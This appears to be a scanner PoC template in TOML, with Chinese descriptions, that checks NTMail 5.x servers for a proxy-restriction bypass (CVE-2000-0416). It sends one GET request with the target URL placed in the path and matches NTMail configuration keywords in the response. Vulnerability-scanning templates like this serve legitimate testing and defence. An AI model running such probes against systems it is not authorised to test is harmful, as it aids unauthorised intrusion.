[info]
author = "ave"
description = "通过向 NTMail Web 配置服务器发送请求，验证是否存在代理绕过漏洞。攻击者可将请求重定向至 NTMail 的 Web 配置管理端口，绕过代理访问限制规则。"
id = "POC-AVE-2000-0449"
name = "NTMail 5.x 代理限制绕过漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0449"]
vuln_id = [
    "CVE-2000-0416",
    "AVE-2000-0449",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "NTMail",
    "Gordano",
    "Configuration",
]
